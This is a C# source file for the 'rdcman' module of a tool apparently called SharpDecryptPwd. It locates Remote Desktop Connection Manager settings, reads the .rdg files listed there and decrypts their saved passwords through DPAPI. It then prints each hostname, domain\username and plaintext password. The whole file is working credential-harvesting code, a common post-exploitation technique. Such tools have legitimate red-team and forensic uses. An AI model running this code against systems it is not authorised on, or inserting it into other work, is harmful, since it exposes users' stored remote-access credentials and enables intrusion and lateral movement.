using System;
using System.IO;
using System.Xml;
using System.Text;
using SharpDecryptPwd.Domain;
using SharpDecryptPwd.Helpers;
using System.Security.Cryptography;
using System.Collections.Generic;

namespace SharpDecryptPwd.Commands
{
    public class RDCMan : ICommand
    {
        /// <summary>
        /// First Base64 decryption -> byte[] -> DPAPI
        /// </summary>
        private static string DecryptPassword(string password)
        {
            byte[] passwordBytes = Convert.FromBase64String(password);
            password = Encoding.UTF8.GetString(ProtectedData.Unprotect(passwordBytes, null, DataProtectionScope.CurrentUser)).Replace("\0", "");
            return password;
        }

        /// <summary>
        /// Parse the .rdg file to obtain the corresponding account password and host information
        /// </summary>
        private static void ParseRDGFile(String RDGPath)
        {
            Writer.Log($"Checking: {RDGPath}");
            XmlDocument RDGFileConfig = new XmlDocument();

            try
            {
                RDGFileConfig.LoadXml(File.ReadAllText(RDGPath));
            }
            catch (Exception e)
            {
                Writer.ErrorLine(e.Message);
                return;
            }

            XmlNodeList nodes = RDGFileConfig.SelectNodes("//server");
            Console.WriteLine();

            foreach (XmlNode node in nodes)
            {
                string hostname = string.Empty, profilename = string.Empty, username = string.Empty, password = string.Empty, domain = string.Empty;

                // Each server node has two child nodes: properties and logonCredentials
                // Traverse properties to get the hostname;
                // Traverse logonCredentials to get the profileName, userName, password, and domain
                foreach (XmlNode subnode in node)
                {
                    foreach (XmlNode subnode_1 in subnode)
                    {
                        switch (subnode_1.Name)
                        {
                            case "name":
                                hostname = subnode_1.InnerText;
                                break;
                            case "profileName":
                                profilename = subnode_1.InnerText;
                                break;
                            case "userName":
                                username = subnode_1.InnerText;
                                break;
                            case "password":
                                password = subnode_1.InnerText;
                                break;
                            case "domain":
                                domain = subnode_1.InnerText;
                                break;
                        }
                    }
                }

                if (!string.IsNullOrEmpty(password))
                {
                    var decrypted = DecryptPassword(password);
                    if (string.IsNullOrEmpty(decrypted))
                    {
                        Writer.Failed($@"Failed to decrypt password for: {username}\{password}");
                    }
                    else
                    {
                        Writer.Out("hostname", hostname);
                        Writer.Out("profilename", profilename);
                        Writer.Out("username", $"{domain}\\{username}");
                        Writer.Out("decrypted", decrypted + "\r\n");
                    }
                }
            }
        }

        public static string CommandName => "rdcman";

        public void DecryptPwd(ArgumentParserContent arguments)
        {
            var rdgPath = arguments.path;
            var RDGFiles = new List<String>();
            if (string.IsNullOrEmpty(rdgPath))
            {
                var RDCManSettings = new XmlDocument();
                rdgPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Remote Desktop Connection Manager\RDCMan.settings";
                Writer.Log($"Checking settings for .rdg files: {rdgPath}");

                try
                {
                    RDCManSettings.LoadXml(File.ReadAllText(rdgPath));
                }
                catch (Exception e)
                {
                    Writer.Error(e.Message);
                }

                var nodes = RDCManSettings.SelectNodes("//FilesToOpen");
                if (nodes.Count == 0)
                {
                    Writer.Warnning("Found 0 .rdg files...");
                    return;
                }
                else
                    Writer.Log($"Found {nodes.Count} .rdg file(s)!");

                foreach (XmlNode node in nodes)
                {
                    var RDGFilePath = node.InnerText;
                    if (!RDGFiles.Contains(RDGFilePath))
                    {
                        RDGFiles.Add(RDGFilePath);
                    }
                }
            }
            else
            {
                Writer.Log($"Using file: {rdgPath}");
                RDGFiles.Add(rdgPath);
            }

            Writer.Line("");
            Writer.Log("Credentials:");

            foreach (String RDGFile in RDGFiles)
            {
                ParseRDGFile(RDGFile);
            }
        }
    }
}
